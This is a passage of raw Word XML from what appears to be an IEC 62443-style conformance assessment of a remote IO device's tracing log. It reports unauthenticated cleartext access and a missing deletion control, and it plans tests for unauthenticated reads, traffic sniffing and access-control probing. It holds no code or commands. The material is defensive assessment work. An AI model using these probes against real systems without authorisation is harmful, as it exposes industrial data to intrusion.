        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="03FB98B4" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 (no purpose-limitation — confirmed).</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The log is readable by </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>anyone with segment access</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, not "exclusively" for a competent-authority request. The </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>only</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> barrier is the environmental </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SRIO-9402 "safe zone behind a firewall"</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> assumption — an </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>all-or-nothing network boundary</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, not the </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fine-grained, purpose-limited, per-request</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> control RQ-014 demands. </w:t>
      </w:r>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId347" w:history="1">
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[100_SRIO_P...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="661DD43B" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>G-3 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>controlled</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>deletion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>confirmed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t>No</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t>documented</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t>erase</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t>command</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t>no</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t>data-lifecycle</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t>control</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D17A8">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="001D17A8">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2163C708" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">G-4 (the paradox — the analytical </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>centrepiece</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> you did not name).</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-014 and RQ-012/013 are in </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>direct tension</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and the device fails </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>both</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for the </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>same root cause</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: it treats the log as a </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>freely-readable, unauthenticated, non-persistent QM buffer</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. That single design choice </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>simultaneously</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (a) violates RQ-012/013 </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>retention</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (cleared on cold start) </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (b) violates RQ-014 </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>restriction</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (readable by anyone). </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>One architectural decision breaks the entire audit-requirement cluster in opposite directions.</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> This is the most defensible, examiner-impressing observation available — foreground it. </w:t>
      </w:r>
      <w:hyperlink r:id="rId348" w:history="1">
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="001D17A8">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0BD75174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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL/conformance conclusion:</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-014 is </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>definitively NOT met.</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The tracing log is exposed via </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>unauthenticated, cleartext HTTP</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (CR 1.1/1.2 absent → CR 2.1 inoperable; CR 4.1/4.3 fail; CR 3.9 confidentiality fails), with </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no purpose-limitation</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (only the coarse SRIO-9402 network assumption) and </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no controlled deletion</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. Uniquely, this non-conformity is </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>structurally entangled with RQ-012/013</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: the same QM-buffer design fails </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>retention</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>restriction</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> at once. Remediation would require an </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>authenticated, TLS-protected, access-controlled, persistent audit store</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — a hardware/architecture change, not a configuration fix.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E5C96EC" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="00000000" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r>
        <w:pict w14:anchorId="2AB7A849">
          <v:rect id="_x0000_i1110" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="2116B606" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="007E038F" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 2 — Methodological Test Planning</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F51D94B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 xml:space="preserve">A </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>conformance-disproof</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement: demonstrate that the log is readable </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>without any credential</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and over </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cleartext</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and that </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no purpose-limitation or deletion control</w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> exists.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3397"/>
        <w:gridCol w:w="2063"/>
        <w:gridCol w:w="2653"/>
        <w:gridCol w:w="629"/>
      </w:tblGrid>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="6EC550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0A1FA4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6C80C3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949CCC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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Proves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50146E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 xml:space="preserve">Scientific </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8"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2C7D07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SVV</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="4CAC8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9D1D1" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t>TS-1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316D1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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Unauthenticated read</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>: from an arbitrary segment node, read the full error log via IoT-Core with no credentials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F2C3C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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Proves G-1/G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (no auth, no purpose-limit)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0F19C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lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">NIST SP 800-115 §4.2; OWASP </w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ISTG-DES-AUTHZ-001</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (unauthorized access to data-exchange service)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1B229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SVV-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="10C37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F06E5" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t>TS-2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82F5F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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Cleartext capture</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>: passively capture the log read on the mirror; confirm plaintext + no TLS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E217C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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> CR 4.1/4.3</w:t>
            </w:r>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>confidentiality</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8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760F2" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t>NIST SP 800-115 §3.5 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>sniffing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve">); ifm </w:t>
            </w:r>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>CM-005</w:t>
            </w:r>
            <w:r w:rsidRPr="001D17A8">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="001D17A8">
              <w:t>SSLscan</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8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F0805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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="1EEFF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EF16E" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t>TS-3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0E425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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Access-control probe</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">: enumerate the IoT-Core for any auth mechanism, role, or </w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>purpose-gate on the log endpoint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D61D0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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Proves G-1</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (no gate by design)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E6ADC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lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">OWASP </w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ISTG-DES-AUTHZ-002</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>ifm</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>CM-004</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (ZAP)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67554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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="001D17A8" w:rsidRPr="001D17A8" w14:paraId="755CD7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996FE" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t>TS-4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2913F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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Deletion-control probe</w:t>
            </w:r>
            <w:r w:rsidRPr="007E038F">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>: attempt any delete/erase of log data; confirm no controlled-deletion command exists (only cold-start wipe)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B0B35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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Proves</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="001D17A8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> G-3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9CA9D" w14:textId="77777777" w:rsidR="001D17A8" w:rsidRPr="001D17A8" w:rsidRDefault="001D17A8" w:rsidP="001D17A8">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="001D17A8">
              <w:t>NIST SP 800-115 §4.2; OWASP ISTG-DES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EEB7C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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="05B1FF5D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 xml:space="preserve">Environment binding: TS-1/TS-3/TS-4 over the management/OT path from the </w:t>
      </w:r>
      <w:r w:rsidRPr="007E038F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
